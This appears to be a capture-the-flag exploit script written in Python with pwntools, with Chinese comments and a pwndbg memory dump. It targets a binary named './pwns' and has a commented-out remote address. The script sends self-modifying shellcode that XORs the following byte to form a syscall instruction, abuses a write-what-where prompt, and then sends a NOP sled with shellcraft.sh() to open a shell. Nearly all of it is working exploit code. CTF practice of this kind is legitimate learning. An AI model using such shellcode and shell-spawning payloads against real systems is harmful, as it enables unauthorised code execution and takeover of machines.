# shellcode部分的话，xor qword ptr [rip], #imm造syscall，或者找个libc相关地址算⼀下syscall;ret的 gadget然后call过去都⾏。
"""
*RIP  0x20230008 ◂— xor dword ptr [rip], 0x9f /* 0x9f000000003581 */
pwndbg> x/32bx  0x20230008                
0x20230008:     0x81    0x35    0x00    0x00    0x00    0x00    0x9f    0x00   
0x20230010:     0x00    0x00    0x90    0x05    0x00    0x00    0x00    0x00   
-- xor dword ptr [rip] -- 0x9f8135000000009f000000, rip指向的是下一条 0x90, 0x90 ^ 0x9f = 0xf 构成 0f05 - syscall
"""
from pwn import *

context(arch='amd64', os='linux', log_level='debug')


def pwns():
    s=process("./pwns")
    gdb.attach(s, 'b*0x0403028\nc')
    # pause()
    # s = remote("192.168.3.253", 53003)
    s.sendlineafter(b"length:\n", b"32")
    shellcodes = """
    xor rax,rax
    mov esi,0x20230000
    xor dword ptr [rip],0x9f
    nop
    """
    s.sendafter(b"code:\n", asm(shellcodes) + b"\x05")
    s.sendlineafter(b"Where?\n", b"4DB038")
    s.sendafter(b"What?\n", p64(0x20230000))
    s.send(b"\x90" * 0x20 + asm(shellcraft.sh()))
    s.interactive()


if __name__ == "__main__":
    pwns()
